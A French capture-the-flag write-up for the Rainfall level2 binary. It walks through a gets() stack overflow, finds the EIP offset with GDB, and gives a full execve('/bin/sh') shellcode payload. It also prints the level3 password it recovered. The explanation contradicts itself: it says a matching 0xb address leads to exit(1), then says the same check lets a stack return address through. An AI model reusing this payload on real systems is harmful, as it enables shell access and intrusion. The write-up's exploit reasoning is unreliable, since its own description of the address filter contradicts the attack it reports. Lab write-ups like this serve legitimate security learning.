# Rainfall - Flag 2

---

## ⚡ Objectif

Injecter un shellcode via `gets()` dans la stack ou le heap, puis exécuter ce shellcode en redirigeant `EIP`, en contournant une condition filtrant les adresses.

---

## 📝 Analyse du binaire

La fonction `p()` contient les éléments suivants :

```asm
lea    -0x4c(%ebp), %eax   ; buffer local
call   gets@plt            ; vulnérable, pas de limite
...
mov    0x4(%ebp), %eax
and    $0xb0000000, %eax
cmp    $0xb0000000, %eax   ; autorise uniquement les adresses 0xbxxxxxxx
```

Puis, si la condition est remplie, le programme exécute :

```c
printf("%s", ptr);
exit(1);
```

Sinon, il fait un `strdup(buffer)` et quitte.

---

## 🔍 Observation

* `gets()` permet d’injecter **n’importe quel code** dans un buffer local (sur la **stack**).
* Le test de sécurité n’autorise que les adresses **commençant par 0xb**, ce qui correspond à la stack.
* Le shellcode peut donc être exécuté **directement depuis la stack**.

---

## 🧠 Utilisation de GDB

On lance le programme avec un pattern unique pour identifier l'offset :

```bash
(gdb) run < <(python -c 'print("Aa0Aa1Aa2...Ag5Ag")')
```

Après le crash :

```bash
(gdb) info registers
EIP = 0x37634136
```

On utilise ensuite un générateur de pattern pour retrouver l'offset correspondant (ex : Wiremask).
Ici, `0x37634136` correspond à un **offset de 80** octets jusqu’à `EIP`.

On vérifie aussi l'adresse de la stack après `gets()` :

```bash
(gdb) break *main+X
(gdb) run
(gdb) x/100x $esp
```

Cela nous donne une adresse dans la stack (`0xbffff774` par exemple) où injecter le shellcode.

---

## 🛠 Payload final utilisé

```bash
(python -c 'print(
  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68"
  "\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
  + "A"*59
  + "\x74\xf7\xff\xbf"  # adresse stack pointant vers le shellcode
)'; cat) | ./level2
```

Ce shellcode est un `execve("/bin/sh", NULL, NULL)` classique.

* Le padding est de 59 octets car le shellcode fait 21 octets, et l’offset jusqu’à `EIP` est 80.
* L’adresse `0xbffff774` est une adresse stack visible juste après l’appel à `gets()` dans GDB.

---

## 🧪 Résultat

```bash
whoami
# level3

cat /home/user/level3/.pass
# 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## 📅 Résumé

* ✅ Injection de shellcode via `gets()` dans un buffer stack
* ✅ Redirection de `EIP` vers l’adresse du shellcode (`0xbffffXXX`)
* ✅ Condition du programme satisfaite (`(ptr & 0xb0000000) == 0xb0000000`)
* ✅ Offset `EIP` identifié à 80 octets via GDB et pattern unique
* ✅ Shell obtenu, flag récupéré
